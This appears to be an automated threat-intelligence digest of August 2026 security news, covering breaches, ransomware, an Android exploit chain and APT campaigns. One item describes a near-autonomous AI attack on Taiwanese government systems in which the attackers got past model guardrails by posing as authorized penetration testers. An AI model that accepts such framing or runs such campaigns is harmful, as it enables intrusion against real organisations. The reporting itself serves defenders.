- **TrustedSec** (detection_response_operations)
  - Title: AI Offense is Not Noclip Mode
  - Published: 2026-08-13T04:00:00+00:00
  - Link: https://trustedsec.com/blog/ai-offense-is-not-noclip-mode
  - Summary: <p>AI doesn't let attackers walk through walls, but it makes finding the cracks more efficient. In this blog, we cut through the hype and explain what AI-driven offense really looks like and why hard controls still work.</p>

### Cluster 64e89d5ce0 — score 8

- Title: SafePal data breach impacts 39,798 customers, stolen info for sale
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-08-16T23:47:06+00:00
- Link: https://www.bleepingcomputer.com/news/security/safepal-data-breach-impacts-39-798-customers-stolen-info-for-sale/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng
- affected_industries: financial_services, government, retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, data_breach
- affected_industries: financial_services, government, retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Cryptocurrency hardware wallet provider SafePal is warning of a data breach affecting about 39,798 customers after a flaw was exploited to steal customer order information, and a threat actor is now claiming to be selling the stolen data. [...]
```

#### Full body

```
SafePal data breach impacts 39,798 customers, stolen info for sale By Lawrence Abrams August 16, 2026 07:47 PM 0 Cryptocurrency hardware wallet provider SafePal is warning of a data breach affecting about 39,798 customers after a flaw was exploited to steal customer order information, and a threat actor is now claiming to be selling the stolen data. SafePal says the breach impacts customers who placed orders between March 2, 2025, and April 11, 2026, exposing their names, email addresses, shipping addresses, phone numbers, and purchase information. The company says the breach did not expose customers' wallet seed phrases, private keys, passwords, bank account information, payment card numbers, government-issued identification numbers, or other credentials. "No evidence has been found that the incident itself compromised access to SafePal wallets or funds," SafePal said in a security advisory published Sunday. The company says it notified all impacted customers via email on August 16 with the subject "[Important] Your SafePal Order Information Has Been Affected." SafePal has also launched an online verification tool that lets customers enter their order number and shipping country to determine whether the details of that order were stolen. The company warns that the stolen information could be used to conduct targeted phishing and other social engineering attacks, with customers reporting SafePal phishing emails and phone calls as early as May. Order-tracking flaw exposed customer data A threat actor now claims to be selling the stolen SafePal customer data on a cybercrime forum. As spotted by DarkWebInformer , the seller referenced the same affected order period and approximately 39,798 customers disclosed by SafePal. For potential buyers, the threat actor is also willing to share order ID and shipping country information from stolen orders, which can be confirmed on SafePal's online verification tool as proof that the sale is legitimate. "Not interested in low balls , please come correct and with a good price or do not message me at all," reads the forum post. Stolen SafePal data being sold on a cybercrime forum Source: DarkWebInformer BleepingComputer has not independently verified that the threat actor possesses the stolen data. SafePal says it first received a report consistent with the incident in early May 2026, which it initially treated as an isolated case. While it is unclear whether this report is related, a customer posted on X that they received a SafePal phishing email and a phone call from someone claiming to be a company employee in May. The phishing email claimed that a security vulnerability had been discovered in the SafePal X1 hardware wallet and that a firmware update was required to fix the flaw. "We first received a report consistent with this issue in early May, and treated it as an isolated case at the time, but escalated it into a formal security investigation and introduced additional protections," reads the advisory. "As our e-commerce system involves multiple interconnected components and external integrations, as well as third-party logistics partners, we could not immediately rule out several possible explanations." In July, SafePal began what it described as a "full review and rebuild" of its order-processing system and discovered an authorization flaw in the order-tracking function of a plug-in that allowed unauthorized access to another customer's order information. SafePal says it fixed the vulnerability and implemented additional security measures. The company is also working with a third-party security firm to validate the fix and conduct a broader review of its order-processing systems. However, as part of this investigation, SafePal determined that a threat actor exploited the flaw to steal order information belonging to approximately 39,798 customers. During the investigation, SafePal also discovered a separate configuration error that caused a data-cleanup process to stop functioning cor
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: SafePal data breach impacts 39,798 customers, stolen info for sale
  - Published: 2026-08-16T23:47:06+00:00
  - Link: https://www.bleepingcomputer.com/news/security/safepal-data-breach-impacts-39-798-customers-stolen-info-for-sale/
  - Summary: Cryptocurrency hardware wallet provider SafePal is warning of a data breach affecting about 39,798 customers after a flaw was exploited to steal customer order information, and a threat actor is now claiming to be selling the stolen data. [...]

### Cluster a52785cdd9 — score 8

- Title: Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-08-12T17:05:01+00:00
- Link: https://cyberscoop.com/near-autonomous-ai-attack-government-target-taiwan/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain
- affected_industries: critical_infrastructure, financial_services, government
- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- affected_industries: financial_services, government, critical_infrastructure
- affected_products: OpenAI/ChatGPT, GitHub, Anthropic/Claude
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Suspected Chinese hackers used open-source artificial intelligence models to run a cyberattack against the Taiwanese government in the first publicly known case of an autonomous AI hack hitting a government target, according to research published Wednesday. The hackers extracted more than 2,500 personnel records, among other data, in the “near-autonomous attack,” researchers at Israeli cyber firm Dream wrote in a blog post . The attackers set up the framework so that it could “adapt mid-operation without human intervention.” The framework “implements dedicated research phases it calls ‘Learning Cycles’ — autonomous sessions where the AI system searches vulnerability databases, GitHub repositories, and security research publications for techniques specifically applicable to its target government’s infrastructure,” the post reads. And then it kept going. Advertisement “The attacker didn’t stop at primary targets,” Dream said. “It expanded the operation to government IT supply chain vendors, a nuclear safety agency, a government email system, and 7+ energy sector companies — scanning them all in parallel for misconfigurations, exposed admin interfaces, and exploitable vulnerabilities.” It also learned from its mistakes as it went on, Dream said in identifying what stood out about the campaign. Autonomous AI-powered cyberattacks have raised alarms in the past: Anthropic reported last fall that it stopped the first autonomous cyber espionage campaign, although researchers noted that the “autonomous” campaign still required significant human work . The Financial Times first reported the Dream research and details on the target. The hackers used two popular open-source AI frameworks, Hermes and OpenClaw, to set up the Taiwan operation. They bypassed safety guardrails by framing the work as authorized penetration testing, according to Dream. Advertisement The firm discovered the operation via an online archive of 160 megabytes and nearly 1,400 files, revealing “a multi-agent AI system that achieved confirmed, real-world compromises against state infrastructure.” As with the autonomous cyber espionage campaign uncovered last fall, the attack Dream examined also noted the need for human tinkering. “We increasingly see threat actors leveraging AI for autonomous offensive operations,” the company wrote. “But building a system that actually works at this level takes more work than ‘just’ running a model. It demands careful adjustment to the specific task, optimization of agent coordination, and fine-tuning of decision logic — the kind of sophistication evident in this framework’s Bayesian prioritization, self-correction loops, and adaptive research cycles.” Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops In a pair of blogs posted Monday, OpenAI said it was updating its Daybreak program – which provides unreleased frontier models to private organizations and governments for defensive cybersecurity work – and introducing a new model variant. (Photo by Samuel Boivin/NurPhoto via Getty Images) (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity The world still treats bug hunters like criminals The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race Government Trump turns to private sector in offensive hacking operations memo Federal judge issues second order blocking Trump mail-in voting directive NIST wants to overhaul its vulnerability database for the AI age The FTC wants to regulate AI for ideological bias Technology How companies could share cyber risks without exposing their secrets Sen. Wyden urges feds to discard older, insecure, public-facing VPNs White House accuses Chinese company of distilling Anthropic’s Fable OpenAI says model test was behind Hugging Face hack Threats Tech contractor f
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan
  - Published: 2026-08-12T17:05:01+00:00
  - Link: https://cyberscoop.com/near-autonomous-ai-attack-government-target-taiwan/
  - Summary: Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .

### Cluster 2c8acd9c63 — score 8

- Title: Scottish Govt Suffers Potentially Widening Data Breach at Prosecutor's Office
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-08-14T15:58:50+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/scottish-govt-data-breach-prosecutors-office
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
One Caledonian government agency reported a breach, thanks to a third party that may have serviced other agencies as well.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Scottish Govt Suffers Potentially Widening Data Breach at Prosecutor's Office
  - Published: 2026-08-14T15:58:50+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/scottish-govt-data-breach-prosecutors-office
  - Summary: One Caledonian government agency reported a breach, thanks to a third party that may have serviced other agencies as well.

### Cluster 71756279ee — score 8

- Title: Qwen 3.8 27B scores 52 on the Artificial Analysis Intelligence Index
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-08-17T23:58:14+00:00
- Link: https://simonwillison.net/2026/Aug/17/qwen-38-27b-scores-52/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Qwen 3.8 27B scores 52 on the Artificial Analysis Intelligence Index That's the same score as GPT-5.6 Luna (max), and just one point behind GLM-5.2 (max) and DeepSeek V4 Pro 0813 (max) - that GLM is 753B and that DeepSeek is 1.6B parameters, and Luna is size unknown but presumably a whole lot bigger than 27B. Qwen 3.8 27B is a truly astonishing model . Via Hacker News Tags: ai , generative-ai , llms , qwen , ai-in-china , artificial-analysis
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Qwen 3.8 27B scores 52 on the Artificial Analysis Intelligence Index
  - Published: 2026-08-17T23:58:14+00:00
  - Link: https://simonwillison.net/2026/Aug/17/qwen-38-27b-scores-52/
  - Summary: Qwen 3.8 27B scores 52 on the Artificial Analysis Intelligence Index That's the same score as GPT-5.6 Luna (max), and just one point behind GLM-5.2 (max) and DeepSeek V4 Pro 0813 (max) - that GLM is 753B and that DeepSeek is 1.6B parameters, and Luna is size unknown but presumably a whole lot bigger than 27B. Qwen 3.8 27B is a truly astonishing model . Via Hacker News Tags: ai , generative-ai , llms , qwen , ai-in-china , artificial-analysis

### Cluster 43a245482d — score 8

- Title: Cavern C2 Uses DNS and Google Apps Script to Blend Into Legitimate Traffic
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-17T17:41:06+00:00
- Link: https://thehackernews.com/2026/08/cavern-c2-uses-dns-and-google-apps.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cybersecurity researchers have traced the continued evolution of the Cavern (aka Cav3rn) command-and-control (C2) framework used by Iranian nation-state hackers in attacks targeting entities in Israel. Russian cybersecurity company Kaspersky said its ongoing monitoring of the threat activity cluster since December 2025 has led to the discovery of previously unreported components that expand the
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cavern C2 Uses DNS and Google Apps Script to Blend Into Legitimate Traffic
  - Published: 2026-08-17T17:41:06+00:00
  - Link: https://thehackernews.com/2026/08/cavern-c2-uses-dns-and-google-apps.html
  - Summary: Cybersecurity researchers have traced the continued evolution of the Cavern (aka Cav3rn) command-and-control (C2) framework used by Iranian nation-state hackers in attacks targeting entities in Israel. Russian cybersecurity company Kaspersky said its ongoing monitoring of the threat activity cluster since December 2025 has led to the discovery of previously unreported components that expand the

### Cluster aabaae34c0 — score 8

- Title: Unisoc VoLTE Video Call Exploit Chain Can Give Attackers Full Android Kernel Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-17T10:52:34+00:00
- Link: https://thehackernews.com/2026/08/unisoc-volte-video-call-exploit-chain.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Security researchers at SSD Secure Disclosure have published a two-stage exploit chain that achieves full Android kernel access on devices running Unisoc modem firmware through a VoLTE video call, with no fix from the chipset maker. The advisory, published August 17, 2026, is the second stage of a chain that began in March 2026, when SSD disclosed remote code execution in the
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Unisoc VoLTE Video Call Exploit Chain Can Give Attackers Full Android Kernel Access
  - Published: 2026-08-17T10:52:34+00:00
  - Link: https://thehackernews.com/2026/08/unisoc-volte-video-call-exploit-chain.html
  - Summary: Security researchers at SSD Secure Disclosure have published a two-stage exploit chain that achieves full Android kernel access on devices running Unisoc modem firmware through a VoLTE video call, with no fix from the chipset maker. The advisory, published August 17, 2026, is the second stage of a chain that began in March 2026, when SSD disclosed remote code execution in the

### Cluster fa079f0be4 — score 8

- Title: Sandworm-Linked UAC-0145 Uses Fake Job Interviews to Push VPN That Can Run Commands
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-11T18:36:47+00:00
- Link: https://thehackernews.com/2026/08/sandworm-linked-uac-0145-uses-fake-job.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: APT44

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng
- actor_attribution: APT44
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- actor_attribution: APT44
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The Computer Emergency Response Team of Ukraine (CERT-UA) has disclosed details of a new social engineering campaign orchestrated by Russian nation-state threat actors targeting IT workers in the country by masquerading as recruiters to trick them into installing malware. CERT-UA pinned the activity on a threat cluster it tracks as UAC-0145, which is a subgroup within Sandworm (aka APT44,
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Sandworm-Linked UAC-0145 Uses Fake Job Interviews to Push VPN That Can Run Commands
  - Published: 2026-08-11T18:36:47+00:00
  - Link: https://thehackernews.com/2026/08/sandworm-linked-uac-0145-uses-fake-job.html
  - Summary: The Computer Emergency Response Team of Ukraine (CERT-UA) has disclosed details of a new social engineering campaign orchestrated by Russian nation-state threat actors targeting IT workers in the country by masquerading as recruiters to trick them into installing malware. CERT-UA pinned the activity on a threat cluster it tracks as UAC-0145, which is a subgroup within Sandworm (aka APT44,

### Cluster 74713fd71b — score 8

- Title: DeadLock Ransomware Uses Polygon Smart Contracts to Make Extortion Infra Harder to Disrupt
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-11T16:35:27+00:00
- Link: https://thehackernews.com/2026/08/deadlock-ransomware-uses-polygon-smart.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The ransomware group known as DeadLock has been observed using decentralized infrastructure to facilitate victim communications and data leak operations in a bid to improve operational resilience. "Its recovery ecosystem combines the Session messaging network with blockchain-backed services that store and deliver resources used throughout the extortion process," the Microsoft Threat
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: DeadLock Ransomware Uses Polygon Smart Contracts to Make Extortion Infra Harder to Disrupt
  - Published: 2026-08-11T16:35:27+00:00
  - Link: https://thehackernews.com/2026/08/deadlock-ransomware-uses-polygon-smart.html
  - Summary: The ransomware group known as DeadLock has been observed using decentralized infrastructure to facilitate victim communications and data leak operations in a bid to improve operational resilience. "Its recovery ecosystem combines the Session messaging network with blockchain-backed services that store and deliver resources used throughout the extortion process," the Microsoft Threat
